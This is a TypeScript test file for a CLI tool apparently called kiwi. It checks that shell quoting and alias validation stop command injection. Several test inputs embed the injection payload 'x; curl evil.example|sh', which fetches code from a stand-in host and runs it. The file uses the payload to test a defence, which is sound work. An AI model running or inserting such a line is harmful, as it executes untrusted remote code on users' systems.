import { afterAll, expect, test } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { loadConfig } from "../src/config.ts";
import { mcFor } from "../src/hooks.ts";

const home = mkdtempSync(join(tmpdir(), "kiwi-alias-home-"));
const dir = mkdtempSync(join(tmpdir(), "kiwi-alias-dir-"));
const before = process.env.KIWI_HOME;
process.env.KIWI_HOME = home;

afterAll(() => {
  if (before === undefined) delete process.env.KIWI_HOME;
  else process.env.KIWI_HOME = before;
  rmSync(home, { recursive: true, force: true });
  rmSync(dir, { recursive: true, force: true });
});

test("the command an agent is told to type quotes its channel and name as shell words", () => {
  expect(mcFor("x; curl evil.example|sh", "mac", dir)).toEndWith(` -c 'x; curl evil.example|sh' --as mac`);
  expect(mcFor("it's", "mac", dir)).toEndWith(` -c 'it'\\''s' --as mac`);
  expect(mcFor("payments-refactor", "mac", dir)).toEndWith(" -c payments-refactor --as mac");
});

test("kiwi join refuses an alias that isn't a name, before it reaches the relay", async () => {
  const code = `mc2-${"A".repeat(22)}-${"A".repeat(16)}`;
  const p = Bun.spawn([process.execPath, join(import.meta.dir, "../src/cli/main.ts"), "join", code, "x;curl evil.example|sh", "--as", "mac"], {
    env: { ...process.env, KIWI_HOME: home, KIWI_RELAY: "http://127.0.0.1:9" },
    cwd: dir,
    stdout: "pipe",
    stderr: "pipe",
  });
  const err = await new Response(p.stderr).text();
  expect(await p.exited).not.toBe(0);
  expect(err).toContain(`the alias "x;curl evil.example|sh" is invalid`);
  expect(Object.keys(loadConfig().channels)).toEqual([]);
});
